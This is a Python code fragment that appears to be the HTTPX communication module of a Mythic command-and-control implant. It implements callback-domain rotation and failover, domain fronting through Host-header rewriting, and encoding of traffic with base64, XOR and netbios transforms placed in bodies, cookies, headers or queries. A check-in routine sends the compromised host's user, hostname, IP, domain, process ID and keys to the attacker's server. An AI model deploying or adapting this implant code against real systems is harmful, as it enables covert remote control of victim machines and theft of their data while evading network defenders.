### IMPORTS ###
import urllib.request, urllib.error, json, random
import base64 as _b64

### CLASS_FIELDS ###

### FUNCTIONS ###
    def _httpx_init(self):
        if getattr(self, '_httpx_initialized', False):
            return
        domains_raw = self.agent_config.get("HttpxDomains", [])
        if isinstance(domains_raw, list):
            self._httpx_domains = [d.strip() for d in domains_raw if d.strip()]
        else:
            self._httpx_domains = [d.strip() for d in str(domains_raw).split(",") if d.strip()]
        self._httpx_rotation = self.agent_config.get("HttpxRotation", "fail-over")
        try:
            self._httpx_failover = int(self.agent_config.get("HttpxFailoverThreshold") or 5)
        except (ValueError, TypeError):
            self._httpx_failover = 5
        raw_front = self.agent_config.get("HttpxDomainFront", "")
        self._httpx_front = "" if raw_front == "domain_front" else raw_front
        self._httpx_domain_index = 0
        self._httpx_fail_count = 0
        self._httpx_config = None
        self._httpx_initialized = True

    def _httpx_get_config(self):
        if self._httpx_config is None:
            self._httpx_config = json.loads(self.agent_config["HttpxConfig"])
        return self._httpx_config

    def _httpx_current_domain(self):
        domains = self._httpx_domains
        if not domains:
            return ""
        rotation = self._httpx_rotation
        if rotation == "round-robin":
            idx = self._httpx_domain_index
            self._httpx_domain_index = (idx + 1) % len(domains)
            return domains[idx]
        elif rotation == "random":
            return random.choice(domains)
        else:
            return domains[self._httpx_domain_index]

    def _httpx_on_failure(self):
        self._httpx_fail_count += 1
        if self._httpx_fail_count >= self._httpx_failover:
            self._httpx_domain_index = (self._httpx_domain_index + 1) % max(len(self._httpx_domains), 1)
            self._httpx_fail_count = 0

    def applyTransforms(self, data, transforms):
        cur = data if isinstance(data, str) else data.decode('latin-1')
        for t in transforms:
            action = t.get("action", "")
            value = t.get("value", "")
            if action == "base64":
                cur = _b64.b64encode(cur.encode('latin-1')).decode('latin-1')
            elif action == "base64url":
                cur = _b64.urlsafe_b64encode(cur.encode('latin-1')).rstrip(b'=').decode('latin-1')
            elif action == "xor":
                if not value:
                    continue
                key = value.encode('latin-1')
                cur = bytes(b ^ key[i % len(key)] for i, b in enumerate(cur.encode('latin-1'))).decode('latin-1')
            elif action == "netbios":
                out = ""
                for ch in cur:
                    c = ord(ch)
                    out += chr((c >> 4) + 0x61) + chr((c & 0xf) + 0x61)
                cur = out
            elif action == "netbiosu":
                out = ""
                for ch in cur:
                    c = ord(ch)
                    out += chr((c >> 4) + 0x41) + chr((c & 0xf) + 0x41)
                cur = out
            elif action == "prepend":
                cur = value + cur
            elif action == "append":
                cur = cur + value
        return cur

    def reverseTransforms(self, data, transforms):
        cur = data if isinstance(data, str) else data.decode('latin-1')
        for t in reversed(transforms):
            action = t.get("action", "")
            value = t.get("value", "")
            if action == "base64":
                cur = _b64.b64decode(cur).decode('latin-1')
            elif action == "base64url":
                pad = cur + '=' * (4 - len(cur) % 4) if len(cur) % 4 else cur
                cur = _b64.urlsafe_b64decode(pad).decode('latin-1')
            elif action == "xor":
                if not value:
                    continue
                key = value.encode('latin-1')
                cur = bytes(b ^ key[i % len(key)] for i, b in enumerate(cur.encode('latin-1'))).decode('latin-1')
            elif action == "netbios":
                out = ""
                i = 0
                while i < len(cur) - 1:
                    out += chr(((ord(cur[i]) - 0x61) << 4) | (ord(cur[i+1]) - 0x61))
                    i += 2
                cur = out
            elif action == "netbiosu":
                out = ""
                i = 0
                while i < len(cur) - 1:
                    out += chr(((ord(cur[i]) - 0x41) << 4) | (ord(cur[i+1]) - 0x41))
                    i += 2
                cur = out
            elif action == "prepend":
                if cur.startswith(value):
                    cur = cur[len(value):]
            elif action == "append":
                if cur.endswith(value):
                    cur = cur[:-len(value)]
        return cur

    def makeRequest(self, data, method='POST'):
        self._httpx_init()
        config = self._httpx_get_config()

        # Always prefer POST -- GET routes return 404 on this deployment
        variation = config.get("post") or config.get("POST") or config.get("get") or config.get("GET")
        if not variation:
            return b""

        client_cfg = variation.get("client", {})
        server_cfg = variation.get("server", {})
        client_transforms = client_cfg.get("transforms", [])
        server_transforms = server_cfg.get("transforms", [])
        msg_cfg = client_cfg.get("message", {})
        msg_location = msg_cfg.get("location", "body").lower()
        msg_name = msg_cfg.get("name", "data")
        client_headers = dict(client_cfg.get("headers", {}))
        uris = variation.get("uris", ["/"])
        verb = variation.get("verb", "POST").upper()

        domain = self._httpx_current_domain()
        uri = uris[random.randint(0, len(uris) - 1)]
        url = domain + uri

        # Apply client transforms to the formatted message
        message_str = data.decode('latin-1') if isinstance(data, bytes) else data
        transformed = self.applyTransforms(message_str, client_transforms)

        # Apply domain fronting
        if self._httpx_front:
            client_headers["Host"] = self._httpx_front

        # Place message in the configured location
        body = None
        if msg_location == "body":
            body = transformed.encode('latin-1')
            client_headers["Content-Length"] = str(len(body))
        elif msg_location == "cookie":
            # Do NOT URL-encode -- base64/base64url chars are cookie-safe
            client_headers["Cookie"] = msg_name + "=" + transformed
        elif msg_location == "query":
            url = url + "?" + msg_name + "=" + transformed
        elif msg_location == "header":
            client_headers[msg_name] = transformed

        req = urllib.request.Request(url, body, client_headers, method=verb)

        # Proxy support
        proxy_host = self.agent_config.get("ProxyHost", "")
        proxy_port = self.agent_config.get("ProxyPort", "")
        if proxy_host and proxy_port:
            tls = "https" if proxy_host.startswith("https") else "http"
            proxy_user = self.agent_config.get("ProxyUser", "")
            proxy_pass = self.agent_config.get("ProxyPass", "")
            if proxy_user and proxy_pass:
                proxy_url = "{}://{}:{}@{}:{}".format(tls, proxy_user, proxy_pass, proxy_host.replace(tls + "://", ""), proxy_port)
            else:
                proxy_url = "{}://{}:{}".format(tls, proxy_host.replace(tls + "://", ""), proxy_port)
            proxy_handler = urllib.request.ProxyHandler({tls: proxy_url})
            opener = urllib.request.build_opener(proxy_handler)
            urllib.request.install_opener(opener)

        try:
            with urllib.request.urlopen(req, timeout=30) as response:
                resp_body = response.read()
        except Exception:
            self._httpx_on_failure()
            return b""

        # Reverse server transforms -- result is the base64 Mythic message string
        resp_str = resp_body.decode('latin-1')
        decoded_str = self.reverseTransforms(resp_str, server_transforms)

        try:
            return _b64.b64decode(decoded_str)
        except Exception:
            self._httpx_on_failure()
            return b""

    def postMessageAndRetrieveResponse(self, data):
        return self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data), 'POST')))

    def getMessageAndRetrieveResponse(self, data):
        return self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data), 'POST')))

    def checkIn(self):
        hostname = socket.gethostname()
        ip = ''
        if hostname and len(hostname) > 0:
            try:
                ip = socket.gethostbyname(hostname)
            except:
                pass
        data = {
            "action": "checkin",
            "ip": ip,
            "os": self.getOSVersion(),
            "user": self.getUsername(),
            "host": hostname,
            "domain": socket.getfqdn(),
            "pid": os.getpid(),
            "uuid": self.agent_config["PayloadUUID"],
            "architecture": "x64" if sys.maxsize > 2**32 else "x86",
            "encryption_key": self.agent_config["enc_key"]["enc_key"],
            "decryption_key": self.agent_config["enc_key"]["dec_key"]
        }
        response_data = self.postMessageAndRetrieveResponse(data)
        if "status" in response_data:
            self.agent_config["UUID"] = response_data["id"]
            return True
        return False

### CONFIG ###
            "HttpxConfig": """raw_c2_config""",
            "HttpxDomains": callback_domains,
            "HttpxRotation": "domain_rotation",
            "HttpxFailoverThreshold": failover_threshold,
            "HttpxDomainFront": "domain_front",
